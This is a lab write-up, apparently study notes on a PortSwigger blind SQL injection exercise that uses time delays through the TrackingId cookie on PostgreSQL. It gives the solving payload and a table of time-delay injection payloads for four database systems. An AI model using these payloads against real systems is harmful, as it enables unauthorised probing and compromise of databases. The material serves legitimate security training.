# Lab 13 — Blind SQL injection with time delays

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

**Entry point:** `TrackingId` cookie · **DB:** PostgreSQL

## Goal

Prove blind SQL injection by making the application pause for a
measurable time — the response gives no other feedback.

## Solution

1. The `TrackingId` cookie is processed in a SQL query, but responses never
   differ — a classic blind case with no boolean oracle.

2. Trigger a time delay by concatenating the result of `pg_sleep(10)`
   into the cookie value:

```
TrackingId: xyz'||pg_sleep(10)--
```

3. The response takes **~10 seconds** — blind SQL injection confirmed,
   lab solved.

## Time-delay primitives per DBMS

| DBMS | Payload |
|------|---------|
| PostgreSQL | `'; SELECT pg_sleep(10)--` / `\|\|pg_sleep(10)--` |
| MySQL | `'; SELECT SLEEP(10)--` |
| MSSQL | `'; WAITFOR DELAY '0:0:10'--` |
| Oracle | `'\|\|dbms_pipe.receive_ready('a',10)\|\|'` (via `DBMS_LOCK` / pipe) |

## Notes

String concatenation `'||...||'` is used because the cookie value is
embedded inside a quoted string in the query — appending `;` statements
would not execute on all stacks.
